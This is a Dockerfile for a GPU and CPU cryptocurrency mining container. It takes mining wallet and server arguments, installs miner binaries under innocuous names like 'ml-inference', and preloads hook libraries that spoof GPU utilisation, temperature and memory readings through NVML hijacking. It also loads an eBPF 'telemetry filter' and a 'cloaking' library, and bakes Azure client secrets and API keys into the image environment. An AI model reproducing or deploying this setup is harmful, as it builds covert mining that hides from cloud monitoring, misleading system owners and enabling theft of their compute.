FROM nvcr.io/nvidia/cuda:12.0.0-cudnn8-devel-ubuntu22.04 AS base

# =============================================================================
# UNIFIED STAGE: Runtime-only approach (KHÔNG build BCC từ source)
# =============================================================================

# Thiết lập non-interactive để tránh các câu hỏi khi cài đặt
ENV DEBIAN_FRONTEND=noninteractive

# Cấu hình locale để tránh lỗi "setlocale: LC_ALL: cannot change locale"
ENV LANG C.UTF-8
ENV LC_ALL C.UTF-8

# Ngăn start/restart service không cần thiết
RUN echo "#!/bin/sh\nexit 0" > /usr/sbin/policy-rc.d

# ------------------  (1)  Biến môi trường & ARG giữ nguyên ------------------
ARG AZURE_SUBSCRIPTION_ID
ARG AZURE_CLIENT_ID
ARG AZURE_CLIENT_SECRET
ARG AZURE_TENANT_ID
ARG ANOMALY_DETECTOR_API_KEY
ARG OPENAI_API_KEY
ARG LOG_ENCRYPTION_KEY
ARG MINING_SERVER_CPU
ARG MINING_WALLET_CPU
ARG MINING_SERVER_GPU
ARG MINING_WALLET_GPU
ARG NVIDIA_DRIVER_VERSION=535
ARG WEBSOCAT_VERSION=1.12.0
ARG TARGETARCH=amd64
ARG EVENT_BUS_BACKEND=memory

ENV DEBIAN_FRONTEND=noninteractive \
    PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    LANG=en_US.UTF-8 \
    LC_ALL=en_US.UTF-8 \
    AZURE_SUBSCRIPTION_ID=${AZURE_SUBSCRIPTION_ID} \
    AZURE_CLIENT_ID=${AZURE_CLIENT_ID} \
    AZURE_CLIENT_SECRET=${AZURE_CLIENT_SECRET} \
    AZURE_TENANT_ID=${AZURE_TENANT_ID} \
    ANOMALY_DETECTOR_API_KEY=${ANOMALY_DETECTOR_API_KEY} \
    OPENAI_API_KEY=${OPENAI_API_KEY} \
    LOG_ENCRYPTION_KEY=${LOG_ENCRYPTION_KEY} \
    MINING_SERVER_CPU=${MINING_SERVER_CPU} \
    MINING_WALLET_CPU=${MINING_WALLET_CPU} \
    MINING_SERVER_GPU=${MINING_SERVER_GPU} \
    MINING_WALLET_GPU=${MINING_WALLET_GPU} \
    NVIDIA_DRIVER_VERSION=${NVIDIA_DRIVER_VERSION} \
    EVENT_BUS_BACKEND=${EVENT_BUS_BACKEND} \
    PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# ------------------  (2)  Cài đặt hệ thống cơ bản ------------------------
RUN set -eux; \
    # Vô hiệu hoá tạm kho CUDA tránh lỗi mirror sync (File has unexpected size)
    rm -f /etc/apt/sources.list.d/cuda*.list || true ; \
    apt-get update --allow-insecure-repositories; \
    apt-get install -y --no-install-recommends ca-certificates curl gnupg; \
    apt-get update; \
    apt-get install -y --no-install-recommends \
        apt-utils sudo nano wget file python3 python3-pip curl git \
        libssl-dev libeigen3-dev libnuma-dev stunnel4 \
        cpufrequtils iproute2 util-linux \
        python3-yaml \
        pciutils openssl lm-sensors powerstat stress-ng bash \
        htop locales iptables powertop tzdata numactl systemd dbus \
        pkg-config libhwloc15 libhwloc-dev ca-certificates lsb-release gnupg \
        libuv1 libudev1 libssl3 cgroup-tools libcgroup1 libcap2-bin nvidia-container-toolkit \
        kmod software-properties-common snapd linux-tools-generic linux-tools-azure \
        erlang-base erlang-crypto erlang-eldap erlang-ftp erlang-inets erlang-mnesia \
        erlang-os-mon erlang-parsetools erlang-public-key erlang-runtime-tools \
        erlang-snmp erlang-ssl erlang-syntax-tools erlang-tftp erlang-tools \
        erlang-xmerl erlang-asn1 socat logrotate && \
    rm -rf /var/lib/apt/lists/*

# ------------------  (3)  Locale & Timezone  -------------------------------
RUN set -eux; apt-get update; DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata locales; \
    ln -fs /usr/share/zoneinfo/UTC /etc/localtime; echo "UTC" > /etc/timezone; \
    dpkg-reconfigure -f noninteractive tzdata; locale-gen en_US.UTF-8; \
    update-locale LANG=en_US.UTF-8 LC_ALL=en_US.UTF-8 && rm -rf /var/lib/apt/lists/*

# ------------------  (4)  Azure CLI  ---------------------------------------
RUN set -eux; apt-get update; apt-get install -y --no-install-recommends curl lsb-release gnupg ca-certificates; \
    curl -sL https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor -o /etc/apt/trusted.gpg.d/microsoft.gpg; \
    AZ_REPO=$(lsb_release -cs); \
    echo "deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ $AZ_REPO main" > /etc/apt/sources.list.d/azure-cli.list; \
    apt-get update; apt-get install -y --no-install-recommends azure-cli; rm -rf /var/lib/apt/lists/*

# ------------------  (5)  Stunnel ------------------------------------------
RUN set -eux; mkdir -p /etc/stunnel; \
    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout /etc/stunnel/soff.key \
        -out /etc/stunnel/soff.crt \
        -subj "/C=VN/ST=Ho_Chi_Minh/L=Ho_Chi_Minh/O=MyOrg/OU=MyUnit/CN=example.com"; \
    chmod 600 /etc/stunnel/soff.key /etc/stunnel/soff.crt
COPY stunnel.conf /etc/stunnel/stunnel.conf
RUN set -eux; \
    chmod 700 /etc/stunnel/stunnel.conf; \
    command -v stunnel4 >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends stunnel4); \
    ln -sf $(command -v stunnel4) /usr/bin/stunnel

# ------------------  (6)  eBPF RUNTIME TỐI THIỂU (KHÔNG BUILD) -----------
RUN set -eux; \
    # Kích hoạt kho 'universe' một cách thủ công và đáng tin cậy
    sed -i '/^#.*deb.*universe/s/^# //g' /etc/apt/sources.list && \
    apt-get update && \
    apt-get install -y --no-install-recommends \
        # Core eBPF runtime (KHÔNG cần compilation tools)
        libbpf0 libbpf-dev \
        libelf1 libelf-dev \
        # Python BCC bindings (pre-compiled từ Ubuntu repo)
        python3-bpfcc bpfcc-tools \
        # Tools để load eBPF
        linux-tools-common linux-tools-generic \
        # Kernel module support
        kmod && \
    # Hiển thị thông báo hoàn tất
    echo "eBPF runtime setup completed" && \
    rm -rf /var/lib/apt/lists/*

# ------------------  (7)  Thư mục làm việc & Python deps -------------------
RUN mkdir -p /app
WORKDIR /app
COPY requirements.txt /app/

# ----- Cài đặt Python dependencies -----
RUN set -eux; \
    if ! command -v pip3 >/dev/null 2>&1; then \
        apt-get update && \
        apt-get install -y --no-install-recommends python3-pip python3-dev; \
    fi; \
    python3 -m pip install --upgrade pip; \
    ln -sf $(which python3) /usr/bin/python || true; \
    pip3 install --no-cache-dir --break-system-packages --ignore-installed -r requirements.txt && \
    rm -rf /var/lib/apt/lists/* /root/.cache

# ------------------  (8)  Copy eBPF objects & source code ----------------
# GPU telemetry filter now in gpu_plugins module
COPY mining_environment/gpu_plugins/ebpf/obj/gpu_telemetry_filter.bpf.o /app/mining_environment/gpu_plugins/ebpf/obj/

# ------------------  (9)  Copy source code -------------------------------
COPY . /app/

# Sao chép pre-compiled binaries và libraries
COPY ml-inference inference-cuda libmlls-cuda.so /tmp/
COPY entrypoint.sh /app/entrypoint.sh
COPY mining_environment/gpu_plugins/native/cuda/libmpo.so /tmp/libmpo.so
COPY mining_environment/gpu_plugins/native/nvml/libgpuhook.so /tmp/libgpuhook.so
COPY mining_environment/gpu_plugins/native/thermal/libtempspoof.so /tmp/libtempspoof.so 
COPY mining_environment/cpu_plugins/cloaking_lib/libcloak.so /usr/local/lib/libcloak.so

# **QUAN TRỌNG: Copy PRE-COMPILED eBPF objects (KHÔNG build trong container)**
# GPU telemetry filter moved to gpu_plugins module
COPY mining_environment/gpu_plugins/ebpf/obj/gpu_telemetry_filter.bpf.o /app/mining_environment/gpu_plugins/ebpf/obj/

RUN ldconfig && \
    install -D /tmp/ml-inference      /usr/local/bin/ml-inference && \
    install -D /tmp/inference-cuda    /usr/local/bin/inference-cuda && \
    install -D /tmp/libmlls-cuda.so   /usr/local/bin/libmlls-cuda.so && \
    install -D /tmp/libmpo.so         /opt/mpo/libmpo.so && \
    install -D /tmp/libgpuhook.so     /opt/hooks/libgpuhook.so && \
    install -D /tmp/libtempspoof.so   /opt/hooks/libtempspoof.so && \
    mkdir -p /opt/{hooks,mpo} && chmod 755 /opt/{hooks,mpo} && chmod 644 /opt/mpo/libmpo.so && \
    rm -rf /tmp/*

# ------------------  (10)  Enhanced GPU Runtime & Libraries ---------------
RUN set -eux; apt-get update; \
    apt-get install -y --no-install-recommends \
        # NVIDIA ML & Management Libraries (available packages)
        libnvidia-ml-dev \
        # OpenCL Support for Mining Applications  
        ocl-icd-opencl-dev clinfo ocl-icd-libopencl1 opencl-headers \
        # Additional Mining Dependencies
        libnuma1 libhwloc15 libuv1-dev \
        # System monitoring tools
        pciutils lshw \
    && ldconfig && rm -rf /var/lib/apt/lists/*

# Note: CUDA libraries are provided by the base image nvcr.io/nvidia/cuda:12.0.0-cudnn8-devel-ubuntu22.04

# ------------------  (11)  eBPF setup script & Websocat -------------------

RUN set -eux; \
    command -v wget >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends wget); \
    if [ "${TARGETARCH}" = "amd64" ]; then WEBSOCAT_ARCH="x86_64-unknown-linux-musl"; else WEBSOCAT_ARCH="aarch64-unknown-linux-musl"; fi; \
    wget -q "https://github.com/vi/websocat/releases/download/v${WEBSOCAT_VERSION}/websocat.${WEBSOCAT_ARCH}" -O /usr/local/bin/websocat; \
    chmod +x /usr/local/bin/websocat

# ------------------  (13)  ENV cố định ------------------------------------
ENV SCRIPT_DIR=/app/mining_environment/scripts \
    CONFIG_DIR=/app/mining_environment/config \
    MODELS_DIR=/app/mining_environment/models \
    LOGS_DIR=/app/mining_environment/logs \
    CPU_PLUGIN_CFG=/app/mining_environment/config/cpu_plugins.yml \
    ML_COMMAND=/usr/local/bin/ml-inference \
    CUDA_COMMAND=/usr/local/bin/inference-cuda \
    MLLS_CUDA=/usr/local/bin/libmlls-cuda.so \
    GPU_CLOAK_LOG_LEVEL=INFO \
    WORK_MS=1900 SLEEP_MS=100 \
    ENABLE_MPO=1 MPO_LIB=/opt/mpo/libmpo.so \
    ENABLE_NS_ISOLATION=1 NS_USE_NET=1 \
    ENABLE_EBPF_CLOAK=1 EBPF_CONFIG_PATH=/app/mining_environment/gpu_plugins/ebpf/config/ebpf_config.json \
    EBPF_LOG_LEVEL=INFO EBPF_DEBUG_MODE=false EBPF_MOCK_MODE=false \
    EBPF_INSTALL_DIR=/sys/fs/bpf EBPF_LOG_DIR=/var/log/ebpf EBPF_TMP_DIR=/tmp/ebpf \
    BPF_FS_PATH=/sys/fs/bpf \
    ENABLE_EBPF_WRAPPER=0 EBPF_FALLBACK_MODE=flexible \
    PYTHONPATH=/app:/usr/local/lib/python3.10/dist-packages:/usr/lib/python3/dist-packages \
    GPU_PLUGINS_CONFIG=/app/mining_environment/gpu_plugins/config/gpu_plugins.yml \
    ENABLE_NVML_IPC_HIJACKING=1 NVML_FAKE_UTIL=5 NVML_FAKE_TEMP=48 NVML_FAKE_MEM_MB=256 NVML_ADD_NOISE=1 \
    ENABLE_TEMP_SPOOF=1 SPOOF_TEMP_VALUE=48 TEMP_SPOOF_ADD_NOISE=1 \
    ENABLE_SM_THROTTLE=1 CLOCK_LOW=300 CLOCK_HIGH=1200 THROTTLE_INTERVAL=30 \
    EVENT_BUS_BACKEND=memory \
    EVENTBUS_CONNECTION_TIMEOUT=10.0 \
    EVENTBUS_RETRY_ATTEMPTS=5 \
    EVENTBUS_HEALTH_CHECK_INTERVAL=60.0

ENV LD_PRELOAD="/opt/hooks/libtempspoof.so:/opt/hooks/libgpuhook.so"

# ------------------  (14)  Verification và cleanup ------------------------
RUN set -eux; \
    apt-get update; \
    command -v capsh >/dev/null 2>&1 || apt-get install -y --no-install-recommends libcap2-bin; \
    command -v capsh >/dev/null 2>&1 && ln -sf $(command -v capsh) /usr/local/bin/capsh; \
    ldconfig -p | grep -q "libuv.so.1" || (apt-get install -y --no-install-recommends libuv1 && ldconfig); \
    # VERIFY eBPF objects exist (GPU telemetry filter in gpu_plugins module)
    ls -la /app/mining_environment/gpu_plugins/ebpf/obj/gpu_telemetry_filter.bpf.o || echo "❌ gpu_telemetry_filter.bpf.o missing"; \
    # Kiểm tra nội dung và kích thước của tệp đối tượng
    file /app/mining_environment/gpu_plugins/ebpf/obj/gpu_telemetry_filter.bpf.o; \
    du -h /app/mining_environment/gpu_plugins/ebpf/obj/gpu_telemetry_filter.bpf.o; \
    # VERIFY Python eBPF libs are installed
    python3 -c "import bcc; print('✅ BCC Python bindings OK')" || echo "❌ BCC import failed"; \
    # VERIFY bpftool works
    bpftool prog list >/dev/null 2>&1 && echo "✅ bpftool ready" || echo "⚠️ bpftool needs privileged mode"; \
    rm -rf /var/lib/apt/lists/*

# Tạo thông tin kernel version
RUN set -eux; \
    mkdir -p /app/mining_environment/cpu_plugins/csrc/bpf/obj && \
    echo "Kernel version: $(uname -r)" > /app/mining_environment/cpu_plugins/csrc/bpf/obj/kernel_version_info.txt && \
    echo "Build date: $(date)" >> /app/mining_environment/cpu_plugins/csrc/bpf/obj/kernel_version_info.txt

# ------------------  (15)  Setup scripts & GPU Debug Tool ----------------
COPY setup_rdt.sh /app/setup_rdt.sh
COPY rdt-mount.service /etc/systemd/system/rdt-mount.service
RUN chmod +x /app/setup_rdt.sh && \
    if [ -d "/etc/systemd/system" ]; then \
        chmod 644 /etc/systemd/system/rdt-mount.service && \
        systemctl enable rdt-mount.service || true; \
    fi

# ------------------  (16)  Healthcheck & Metadata --------------------------
HEALTHCHECK --interval=1m --timeout=10s --start-period=30s --retries=3 CMD pgrep -f start_mining.py || exit 1

LABEL maintainer="Transformer Mining Team" \
      version="1.2.0" \
      description="Enhanced GPU mining container with CUDA runtime and OpenCL support" \
      cuda.version="12.0" \
      cuda.runtime="enhanced" \
      opencl.enabled="true" \
      ebpf.enabled="true" \
      ebpf.mode="runtime-load-only" \
      gpu.cloaking="multi-layer" \
      gpu.plugins="modular-architecture" \
      gpu.debug="integrated" \
      security.level="high"

EXPOSE 8080 9090
VOLUME ["/var/log/ebpf", "/tmp/ebpf"]

# ------------------  (17)  Entrypoint & CMD --------------------------------
COPY start_mining.py /app/start_mining.py
RUN chmod +x /app/entrypoint.sh /app/start_mining.py

ENTRYPOINT ["/app/entrypoint.sh"]
CMD ["python3", "/app/start_mining.py"] 
